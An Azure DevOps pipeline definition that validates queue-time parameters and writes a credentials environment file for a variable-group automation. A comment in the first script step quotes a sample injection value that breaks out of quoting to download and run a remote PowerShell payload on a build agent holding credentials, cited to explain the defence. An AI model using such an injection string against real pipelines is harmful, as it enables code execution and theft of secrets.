# Runs variable-group-configuration from Azure DevOps itself.
#
# See pipelines/README.md for the pattern every pipeline in this folder follows.
#
# One extra concern here: writing a Variable Group that holds secrets requires
# re-posting those secrets in the same request, so the secret variables the groups
# in scope contain have to be available to this run under their own names. If one
# is missing, the automation blocks rather than writing - which is the correct
# outcome, and the plan step will say so before anything is applied.

trigger: none
pr: none

parameters:
  - name: command
    displayName: Command
    type: string
    default: plan
    values:
      - validate
      - inventory
      - plan
      - smoke
      - apply

  - name: applicationKey
    displayName: Application key (blank means the whole scope)
    type: string
    default: ''

  - name: environment
    displayName: Environment (blank means every environment in scope)
    type: string
    default: ''
    values:
      - ''
      - DEV
      - QA
      - PROD

  - name: confirmApply
    displayName: Confirm apply
    type: boolean
    default: false

  - name: organizationUrl
    displayName: Organization URL
    type: string
    default: https://dev.azure.com/contoso

  - name: project
    displayName: Team project
    type: string
    default: Platform

variables:
  - group: ado-as-code

pool:
  vmImage: windows-latest

steps:
  - checkout: self
    displayName: Check out the repository

  - powershell: |
      $ErrorActionPreference = 'Stop'

      # Queue-time parameters reach this script as environment variables, never as a
      # template expression inside the script body. A template expression is expanded
      # at compile time, so a free-text parameter is pasted in as SOURCE CODE. A
      # value of
      #     x'; iwr http://host/payload.ps1 | iex; '
      # closed the quoting and ran on the agent, in a job holding ADO_PAT and the
      # connection credentials. Reading $env: keeps the value data.
      #
      # The single-line check is the second half. Even as data, a value carrying a
      # newline would append arbitrary KEY=VALUE lines to the environment file below -
      # enough to override ADO_PAT or inject a credential.
      function Assert-ParameterValue {
        param(
          [Parameter(Mandatory)] [string] $Name,
          [AllowEmptyString()] [string] $Value,
          [switch] $Required,
          [string] $Pattern
        )

        if ([string]::IsNullOrWhiteSpace($Value)) {
          if ($Required) { throw "Parameter '$Name' is required and arrived empty." }
          return ''
        }
        # Character codes rather than an escape sequence: this text passes through a
        # YAML block scalar, and a backslash escape in that position is easy to mangle.
        if ($Value.IndexOfAny([char[]]@([char]13, [char]10)) -ge 0) {
          throw "Parameter '$Name' contains a line break, which would inject extra variables into the environment file."
        }

        $trimmed = $Value.Trim()
        if ($Pattern -and $trimmed -notmatch $Pattern) {
          throw "Parameter '$Name' has value '$trimmed', which does not match the expected form $Pattern."
        }
        return $trimmed
      }

      $organizationUrl = Assert-ParameterValue -Name 'organizationUrl' -Value $env:PARAM_ORGANIZATION_URL -Required `
        -Pattern '^https://[A-Za-z0-9][A-Za-z0-9.-]*/[A-Za-z0-9._~%-]+$'
      $project = Assert-ParameterValue -Name 'project' -Value $env:PARAM_PROJECT -Required `
        -Pattern '^[A-Za-z0-9][A-Za-z0-9 ._-]*$'

      $lines = @(
        "ADO_ORG_URL=$organizationUrl",
        "ADO_PROJECT=$project",
        "ADO_PAT=$env:ADO_PAT"
      )

      # Every secret Variable Group value this run may need to re-post. A name with
      # no value is written as an empty line and skipped, so the automation reports
      # the group as blocked instead of silently blanking the credential.
      foreach ($name in @('APP_ALPHA_PASSWORD', 'APP_BETA_PASSWORD')) {
        $value = [Environment]::GetEnvironmentVariable($name)
        if ($value) { $lines += "$name=$value" }
      }

      $lines | Set-Content -LiteralPath .env.pipeline -Encoding UTF8
      Write-Host "Wrote .env.pipeline with $($lines.Count) variable(s). Values are not echoed."
    displayName: Materialise the environment file
    env:
      ADO_PAT: $(ADO_PAT)
      PARAM_ORGANIZATION_URL: ${{ parameters.organizationUrl }}
      PARAM_PROJECT: ${{ parameters.project }}
      APP_ALPHA_PASSWORD: $(APP_ALPHA_PASSWORD)
      APP_BETA_PASSWORD: $(APP_BETA_PASSWORD)

  - powershell: |
      $ErrorActionPreference = 'Stop'

      # Same rule as the previous step: parameters arrive as environment variables.
      # 'command' is re-checked against the closed list even though the parameter
      # declares one, because this script must not depend on that declaration
      # surviving a future edit.
      $command = "$env:PARAM_COMMAND".Trim()
      if ($command -notin @('validate', 'inventory', 'plan', 'smoke', 'apply')) {
        throw "Unsupported command '$command'."
      }

      function Get-OptionalParameter {
        param([Parameter(Mandatory)] [string] $Name, [AllowEmptyString()] [string] $Value, [Parameter(Mandatory)] [string] $Pattern)
        if ([string]::IsNullOrWhiteSpace($Value)) { return '' }
        $trimmed = $Value.Trim()
        if ($trimmed -notmatch $Pattern) {
          throw "Parameter '$Name' has value '$trimmed', which does not match the expected form $Pattern."
        }
        return $trimmed
      }

      $applicationKey = Get-OptionalParameter -Name 'applicationKey' -Value $env:PARAM_APPLICATION_KEY -Pattern '^[A-Za-z0-9][A-Za-z0-9_-]*$'
      $environmentName = Get-OptionalParameter -Name 'environment' -Value $env:PARAM_ENVIRONMENT -Pattern '^[A-Z0-9_]+$'

      $arguments = @{
        Command = $command
        EnvFile = '.env.pipeline'
      }
      if ($applicationKey) { $arguments.ApplicationKey = $applicationKey }
      if ($environmentName) { $arguments.Environment = $environmentName }

      if ($command -eq 'apply') {
        if ("$env:PARAM_CONFIRM_APPLY" -ne 'True') {
          throw "'apply' requires the Confirm apply parameter. Re-run with it ticked, after reviewing a plan."
        }
        $arguments.ConfirmApply = $true
      }

      ./automations/variable-group-configuration/Invoke-VariableGroupConfiguration.ps1 @arguments
    displayName: Run variable-group-configuration
    env:
      PARAM_COMMAND: ${{ parameters.command }}
      PARAM_APPLICATION_KEY: ${{ parameters.applicationKey }}
      PARAM_ENVIRONMENT: ${{ parameters.environment }}
      PARAM_CONFIRM_APPLY: ${{ parameters.confirmApply }}

  - publish: artifacts
    artifact: variable-group-configuration-$(Build.BuildId)
    displayName: Publish the plan, report and receipt
    condition: always()
